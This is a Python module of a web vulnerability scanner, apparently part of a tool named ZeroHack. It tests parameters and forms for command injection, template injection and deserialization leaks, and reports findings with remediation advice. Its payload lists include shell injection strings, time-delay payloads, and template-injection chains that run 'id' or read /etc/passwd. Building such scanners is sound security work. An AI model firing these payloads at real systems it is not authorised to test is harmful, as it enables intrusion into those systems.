"""
ZeroHack v2.0 - RCE / Command Injection / SSTI Tester
Covers: OS command injection, Server-Side Template Injection (SSTI),
        deserialization indicators, and time-delay confirmation.
"""

import re
import time
from typing import List
from urllib.parse import urlparse, parse_qs

from modules.enhanced_scanner import BaseScanner
from modules.notification_system import Finding, print_module_start, print_finding, print_info

# ─────────────────────────────────────────────────────────────
# Command Injection payloads
# ─────────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    # Shell metacharacters
    "; ls",          "| ls",         "& ls",         "`ls`",
    "; whoami",      "| whoami",     "& whoami",     "`whoami`",
    "; id",          "| id",         "& id",
    # Windows
    "& dir",         "| dir",        "; dir",
    "& ipconfig",    "| ipconfig",
    # Bypass attempts
    ";ls${IFS}",     "|\x09ls",
    # Concatenation
    "$(ls)",         "$(`ls`)",
    # Newline injection
    "\nls\n",        "\nid\n",
]

# Time-based command injection (sleep/timeout)
CMD_TIME_PAYLOADS_UNIX = [
    "; sleep {d}",   "| sleep {d}",   "& sleep {d}",
    "; sleep {d} #", "$(sleep {d})",  "`sleep {d}`",
]
CMD_TIME_PAYLOADS_WIN = [
    "& ping -n {d} 127.0.0.1",
    "| ping -n {d} 127.0.0.1",
]

CMD_OUTPUT_INDICATORS = [
    # Unix
    r"root:x:", r"bin:x:", r"daemon:x:",    # /etc/passwd fragments
    r"uid=\d+\(",                             # id output
    r"total \d+",                             # ls output
    r"drwxr",
    # Windows
    r"Volume in drive",
    r"Windows IP Configuration",
    r"Directory of",
]

# ─────────────────────────────────────────────────────────────
# SSTI payloads
# ─────────────────────────────────────────────────────────────
SSTI_DETECTION_PAYLOADS = [
    ("{{7*7}}",     "49"),           # Jinja2, Twig
    ("${7*7}",      "49"),           # Freemarker, Spring
    ("<%= 7*7 %>",  "49"),           # ERB (Ruby)
    ("#{7*7}",      "49"),           # Ruby interpolation
    ("${{7*7}}",    "49"),           # Pebble
    ("*{7*7}",      "49"),           # Thymeleaf
    ("{{7*'7'}}",   "7777777"),      # Jinja2 string multiply
]

SSTI_RCE_PAYLOADS = [
    # Jinja2 RCE
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    # Twig RCE
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker
    "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
]

# ─────────────────────────────────────────────────────────────
# Deserialization indicators in responses
# ─────────────────────────────────────────────────────────────
DESER_INDICATORS = [
    r"java\.io\.Serializable",
    r"java\.lang\.ClassNotFoundException",
    r"sun\.reflect\.NativeMethodAccessorImpl",
    r"org\.springframework\.web\.context",
    r"ObjectInputStream",
    r"_class",
    r"__php_incomplete_class",
    r"O:\d+:\"",                       # PHP serialize
    r"a:\d+:\{",                       # PHP array serialize
]

DELAY_THRESHOLD = 4.5
CMD_DELAY      = 5


class RCETester(BaseScanner):
    """
    Remote Code Execution / Command Injection / SSTI tester.
    Uses output-based and time-delay confirmation techniques.
    """

    MODULE = "RCE / Command Injection / SSTI"

    def scan(self, mode: str = "both") -> List[Finding]:
        print_module_start(self.MODULE, self.target)
        self.findings.clear()

        parsed = urlparse(self.target)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        param_names = params or ["cmd", "exec", "command", "query", "input", "data", "ping", "host"]

        resp = self.get(self.target)
        forms = []
        if resp:
            forms = self.extract_forms(resp.text, self.target)
            print_info(f"Testing {len(param_names)} param(s) + {len(forms)} form(s) for RCE/SSTI")

        # 1. Output-based command injection (GET params)
        self._test_cmd_injection_output(param_names)

        # 2. Time-based command injection (GET params)
        self._test_cmd_injection_time(param_names)

        # 3. SSTI detection (GET params)
        self._test_ssti(param_names)

        # 4. Deserialization indicators
        self._test_deserialization(resp)

        # 5. Forms
        for form in forms:
            self._test_form_cmd(form)

        return self.get_findings()

    # ─────── Output-based CMD injection ──────────────────────
    def _test_cmd_injection_output(self, params: List[str]):
        for param in params:
            for payload in CMD_PAYLOADS:
                url = self.inject_param(self.target, param, payload)
                resp = self.get(url)
                if not resp:
                    continue
                match = self._check_cmd_output(resp.text)
                if match:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="OS Command Injection (Output-based)",
                        severity="CRITICAL",
                        description=(
                            f"Parameter '{param}' is vulnerable to OS command injection. "
                            f"Command output was reflected in the response."
                        ),
                        target=url,
                        evidence=f"Payload: {payload!r} → Output indicator: {match!r}",
                        remediation=(
                            "Never pass user input to shell commands. "
                            "Use language-native libraries instead of shell calls. "
                            "If unavoidable, use strict allowlists and subprocess with arg lists (no shell=True)."
                        ),
                        owasp="A03:2021 – Injection",
                        cve="CWE-78",
                    )
                    print_finding(f)
                    break

    # ─────── Time-based CMD injection ────────────────────────
    def _test_cmd_injection_time(self, params: List[str]):
        all_time_payloads = [
            p.format(d=CMD_DELAY) for p in CMD_TIME_PAYLOADS_UNIX + CMD_TIME_PAYLOADS_WIN
        ]
        for param in params:
            for payload in all_time_payloads:
                url = self.inject_param(self.target, param, payload)
                _, elapsed = self.measure_response_time(url)
                if elapsed >= DELAY_THRESHOLD:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="OS Command Injection (Time-based Blind)",
                        severity="CRITICAL",
                        description=(
                            f"Parameter '{param}' caused a {elapsed:.1f}s delay, confirming "
                            "blind OS command injection."
                        ),
                        target=url,
                        evidence=f"Payload: {payload!r} | Response time: {elapsed:.2f}s",
                        remediation="Avoid shell invocations. Use subprocess with arg list. Sandbox the process.",
                        owasp="A03:2021 – Injection",
                        cve="CWE-78",
                    )
                    print_finding(f)
                    break

    # ─────── SSTI ─────────────────────────────────────────────
    def _test_ssti(self, params: List[str]):
        for param in params:
            for payload, expected in SSTI_DETECTION_PAYLOADS:
                url = self.inject_param(self.target, param, payload)
                resp = self.get(url)
                if resp and expected in resp.text:
                    severity = "CRITICAL"
                    # Try RCE payload
                    rce_evidence = ""
                    for rce_payload in SSTI_RCE_PAYLOADS[:1]:
                        rce_url  = self.inject_param(self.target, param, rce_payload)
                        rce_resp = self.get(rce_url)
                        if rce_resp and self._check_cmd_output(rce_resp.text):
                            rce_evidence = "RCE confirmed via SSTI"
                            break

                    f = self.add_finding(
                        module=self.MODULE,
                        title="Server-Side Template Injection (SSTI)",
                        severity=severity,
                        description=(
                            f"Parameter '{param}' is vulnerable to SSTI. "
                            f"The expression {payload!r} evaluated to {expected!r}. "
                            + (rce_evidence or "RCE may be possible via template escalation.")
                        ),
                        target=url,
                        evidence=f"Payload {payload!r} → expected {expected!r} in response. {rce_evidence}",
                        remediation=(
                            "Never render user input as templates. "
                            "Use sandboxed template environments. Validate and sanitize all template data."
                        ),
                        owasp="A03:2021 – Injection",
                        cve="CWE-94",
                    )
                    print_finding(f)
                    break

    # ─────── Deserialization ──────────────────────────────────
    def _test_deserialization(self, resp):
        if not resp:
            return
        body = resp.text
        for pattern in DESER_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                f = self.add_finding(
                    module=self.MODULE,
                    title="Potential Insecure Deserialization Indicator",
                    severity="MEDIUM",
                    description=(
                        "The response contains patterns associated with Java, PHP, or Python serialization. "
                        "Manual analysis is required to confirm exploitability."
                    ),
                    target=self.target,
                    evidence=f"Pattern matched: {pattern!r}",
                    remediation=(
                        "Avoid deserializing untrusted data. "
                        "Use allowlists of expected classes. Sign serialized payloads."
                    ),
                    owasp="A08:2021 – Software and Data Integrity Failures",
                    cve="CWE-502",
                )
                print_finding(f)
                return  # one finding is enough

    # ─────── Form CMD injection ───────────────────────────────
    def _test_form_cmd(self, form: dict):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "image", "reset", "hidden"):
                continue
            for payload in CMD_PAYLOADS[:8]:
                data = {i["name"]: i["value"] for i in inputs}
                data[inp["name"]] = payload
                resp = self.post(action, data=data) if method == "POST" else self.get(action, params=data)
                if not resp:
                    continue
                match = self._check_cmd_output(resp.text)
                if match:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="OS Command Injection via Form",
                        severity="CRITICAL",
                        description=f"Form input '{inp['name']}' at {action} is vulnerable to command injection.",
                        target=action,
                        evidence=f"Payload: {payload!r} → Output: {match!r}",
                        remediation="Sanitize form inputs. Never pass form data to shell commands.",
                        owasp="A03:2021 – Injection",
                    )
                    print_finding(f)
                    break

    # ─────── Helper ───────────────────────────────────────────
    @staticmethod
    def _check_cmd_output(body: str) -> str:
        for pattern in CMD_OUTPUT_INDICATORS:
            m = re.search(pattern, body)
            if m:
                return m.group(0)
        return ""
